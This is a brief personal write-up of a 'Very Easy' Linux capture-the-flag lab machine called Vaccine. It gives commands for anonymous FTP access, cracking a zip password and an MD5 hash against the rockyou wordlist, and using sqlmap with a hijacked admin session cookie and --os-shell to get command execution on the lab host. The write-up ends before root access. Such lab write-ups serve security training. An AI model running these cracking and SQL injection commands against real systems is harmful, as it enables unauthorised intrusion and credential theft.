**Title:** 00 - Vaccine
**Tags:** [[Very Easy]]
**Topics:** #ftp #SQL #SUID 

---

# Intro
| Dificulty | OS | Start Date | End Date |
|---|---|---|---|
| Very Easy | Linux | 11/06/2022 | 12/06/2022 |

# Process
1. Login as `anonymous` on ftp service >  `get` the .zip and `unzip`.
2. Use John The Reapper to unzip the file.

# John The Reapper
There is a script call it `zip2john` that creates a hash out of a zip file. After, with this hash, we run a wordlist to brute force the password.

> Get the hash
```bash
$ zip2john backup.zip > hash.txt
```

> Brute Force the hash
```bash
$ john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> Show the password
```bash
$ john --show hash.txt
```

```ad-caution
Must `gunzip rockyou.txt.gz`
```

# MD5 Password
Inside index.php there was admin's password encrypted using MD5. 
To crack MD5 password execute this command:
```bash
$ sudo hashcat -m 0 pass.md5 /usr/share/wordlists/rockyou.txt
```


# SQL Injection
In the website there is a search bar that we can explote with SQL injection.
We can use sqlmap but before executing any command, we will need to grab the cookie to authenticat admin user. 
[//]: Install cooki-editor extension

```bash
$ sqlmap -u http://10.129.95.174/dashboard.php?search=hello --cookie="PHPSESSID=rp7ki2fucgrc0brl7f1l9j5p9e" --os-shell
```

User flag is in `/var/lib/postgresql/`

```ad-note
I found users flag but I lost in the proccess of creating a interactive shell.
I only need root flag.
```
